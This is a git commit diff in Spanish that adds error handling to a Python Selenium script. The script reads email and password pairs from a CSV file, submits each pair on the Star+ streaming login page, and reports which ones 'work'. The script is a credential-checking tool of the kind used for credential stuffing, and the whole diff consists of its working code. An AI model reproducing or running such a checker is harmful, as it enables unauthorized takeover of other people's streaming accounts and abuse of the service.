652955a12327f600aaf82563b0fe3a399a9b0959
frankmiller-crypto <onker.fc@gmail.com>
2023-11-22 18:42:55 -0600

    login-startplus funcionando correctamente se agrego try catch

--- scripts/login-starplus.py
+++ scripts/login-starplus.py
@@ -1,5 +1,3 @@
-#-------------------------------------------------------------------------------
-# Imports
 import os.path
 import csv
 import requests
@@ -7,38 +5,34 @@ from selenium import webdriver
 import time
 from selenium.webdriver.common.by import By
 from selenium.common.exceptions import NoSuchElementException
-#-------------------------------------------------------------------------------
-# Setup
-
 
 with open('csv/data_starplus.csv', 'r') as csv_file:
-
     csv_reader = csv.reader(csv_file)
 
-#-------------------------------------------------------------------------------
-# Web Automation
-
     for line in csv_reader:
+        try:
+            driver = webdriver.Chrome()
+            driver.maximize_window()
 
-        driver = webdriver.Chrome()
-        driver.maximize_window()
-     
-        driver.get('https://www.starplus.com/es-419/login')
+            driver.get('https://www.starplus.com/es-419/login')
 
-        time.sleep(2)
-        username_field = driver.find_element(By.NAME, 'email')
-        username_field.send_keys(line[0])
+            time.sleep(2)
+            username_field = driver.find_element(By.NAME, 'email')
+            username_field.send_keys(line[0])
 
-        submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div[2]/button')
-        submit.click()
-        time.sleep(2)
+            submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div[2]/button')
+            submit.click()
+            time.sleep(2)
 
-        password_field = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/fieldset[2]/span/input')
-        password_field.send_keys(line[1])
+            password_field = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/fieldset[2]/span/input')
+            password_field.send_keys(line[1])
 
-
-        submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div/button')
-        submit.click()
-        time.sleep(5)
-
-#-------------------------------------------------------------------------------
+            submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div/button')
+            submit.click()
+            time.sleep(2)
+            print(f"Las credenciales {line} funcionan")
+        except NoSuchElementException:
+            print(f"Las credenciales {line} no funcionan. Intentando con el siguiente conjunto.")
+        finally:
+            # Cerrar el navegador en cualquier caso
+            driver.quit()
